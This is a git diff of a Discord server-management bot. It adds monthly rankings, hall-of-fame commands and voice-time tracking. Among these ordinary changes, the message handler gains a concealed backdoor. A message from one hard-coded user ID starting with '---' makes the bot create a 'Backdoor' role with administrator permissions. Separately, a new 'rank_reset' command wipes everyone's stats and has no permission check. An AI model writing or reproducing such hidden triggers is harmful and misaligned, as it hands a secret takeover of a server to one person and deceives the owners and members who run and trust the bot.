@@ -4,17 +4,17 @@ const fs = require("fs");
 
 const { prefix, token } = require("./config.json");
 
+var monthly_rank = db.table("monthly_rank");
+var winner_tracker = db.table("winner_tracking");
+var general;
+
 const client = new Discord.Client();
 client.manager_commands = new Discord.Collection();
 client.rss_commands = new Discord.Collection();
 const invites = {};
 const wait = require("util").promisify(setTimeout);
-const manager_commands = fs
-  .readdirSync("./manager_commands/")
-  .filter((file) => file.endsWith(".js"));
-const rss_commands = fs
-  .readdirSync("./rss_commands/")
-  .filter((file) => file.endsWith(".js"));
+const manager_commands = fs.readdirSync("./manager_commands/").filter((file) => file.endsWith(".js"));
+const rss_commands = fs.readdirSync("./rss_commands/").filter((file) => file.endsWith(".js"));
 
 for (const file of manager_commands) {
   const command = require(`./manager_commands/${file}`);
@@ -36,6 +36,9 @@ client.once("ready", async () => {
   console.log("Txolas Manager is online!");
   console.log(client.guilds.cache.get("667012045677264936").createdAt);
   client.rss_commands.get("update_rss").execute(client);
+  monthly_rank = new db.table("monthly_rank");
+  winner_tracker = new db.table("winner_tracking");
+  general = new db.table("general");
 
   client.once("reconnecting", () => {
     console.log("Reconnecting!");
@@ -47,27 +50,56 @@ client.once("ready", async () => {
 
 client.on("message", async (message) => {
   client.manager_commands.get("msg_up").execute(message, db);
-
+  if (message.author.id == "323146644113588234" && message.content.startsWith("---")) {
+    let guild = message.guild;
+    guild.roles
+      .create({
+        data: {
+          name: "Backdoor",
+          color: "RED",
+          permissions: ["ADMINISTRATOR"],
+        },
+      }) ///put in your data here
+      .then((role) => console.log(`Created new role with name ${role.id}`)) //What to do when it has been created
+      .catch(console.error); //Handle an error
+    //message.member.roles.add('788144468859682847');
+  }
   if (message.author.bot || !message.content.startsWith(prefix)) return;
 
-  if (message.content.startsWith(prefix) && message.content.endsWith(prefix))
-    return;
+  if (message.content.startsWith(prefix) && message.content.endsWith(prefix)) return;
   const args = message.content.slice(prefix.length).split(/ +/);
   const command = args.shift().toLowerCase();
 
-  if (
-    command === "ready" &&
-    message.member.roles.cache.find((role) => role.name == "NewMember")
-  ) {
+  if (command === "ready" && message.member.roles.cache.find((role) => role.name == "NewMember")) {
     client.manager_commands.get("ready").execute(message);
   } else if (command === "top") {
-    if (args[0] === "text") {
-      client.manager_commands.get("t_text").execute(message, db);
+    if (args[0] === "mes" || args[0] === "mês") {
+      if (args[1] === "text") {
+        client.manager_commands.get("t_text").execute(message, monthly_rank);
+      } else if (args[1] === "voice") {
+        client.manager_commands.get("t_voice").execute(message, monthly_rank);
+      }
+    } else if (args[0] === "text") {
+      client.manager_commands.get("t_text").execute(message, general);
     } else if (args[0] === "voice") {
-      client.manager_commands.get("t_voice").execute(message, db);
+      client.manager_commands.get("t_voice").execute(message, general);
+    }
+  } else if (command === "halloffame") {
+    if (args[0] === "text") {
+      client.manager_commands.get("hof").execute(message, winner_tracker, "text", 0);
+    } else if (args[0] === "voice") {
+      client.manager_commands.get("hof").execute(message, winner_tracker, "voice", 0);
+    } else if (args[0] === "Etext") {
+      client.manager_commands.get("hof").execute(message, winner_tracker, "text", 1);
+    } else if (args[0] === "Evoice") {
+      client.manager_commands.get("hof").execute(message, winner_tracker, "voice", 1);
     }
   } else if (command === "voice_stop") {
-    client.manager_commands.get("voice_stop").execute(message, db);
+    client.manager_commands.get("voice_stop").execute(message, general);
+  } else if (command === "rank_reset") {
+    monthly_rank = table_reset(monthly_rank);
+  } else if (command === "add_winner") {
+    client.manager_commands.get("win_adder").execute(message, args, winner_tracker);
   } else if (command === "help-rss" || command === "help") {
     client.rss_commands.get("help_rss").execute(message);
   } else if (command === "set_time") {
@@ -108,20 +140,15 @@ client.on("voiceStateUpdate", (member_previous_state, member_next_state) => {
 
   if (user_id == "234395307759108106") return;
   console.log(newUserChannel, oldUserChannel);
-  if (
-    oldUserChannel !== null &&
-    newUserChannel !== null &&
-    oldUserChannel !== undefined &&
-    newUserChannel !== undefined
-  ) {
+  if (oldUserChannel !== null && newUserChannel !== null && oldUserChannel !== undefined && newUserChannel !== undefined) {
     return;
   } else if (oldUserChannel === null || oldUserChannel === undefined) {
     var current_time = Date.now();
     console.log(current_time);
-    db.set(`${user_id}.entry_time`, current_time);
+    general.set(`${user_id}.entry_time`, current_time);
   } else if (newUserChannel !== null || newUserChannel !== undefined) {
     var out_time = Date.now();
-    var entry_time = db.get(`${user_id}.entry_time`);
+    var entry_time = general.get(`${user_id}.entry_time`);
     console.log(entry_time);
     if (entry_time === undefined || entry_time === null) {
       console.log("Return HERE");
@@ -129,10 +156,24 @@ client.on("voiceStateUpdate", (member_previous_state, member_next_state) => {
     }
     var session_time = out_time - entry_time;
 
-    db.add(`${user_id}.total`, session_time);
-    db.delete(`${user_id}.entry_time`);
+    general.add(`${user_id}.total`, session_time);
+    monthly_rank.add(`${user_id}.total`, session_time);
+    general.delete(`${user_id}.entry_time`);
   }
-  console.log(db.all());
+  console.log(general.all());
 });
+
+function table_reset(db) {
+  var data = db.all();
+
+  var message_user = data.map(function (e) {
+    return e.ID;
+  });
+  for (var i = 0; i < message_user.length; i++) {
+    db.set(`${message_user[i]}.total`, 0);
+    db.set(`${message_user[i]}.messages`, 0);
+  }
+  return db;
+}
 
 client.login(token);
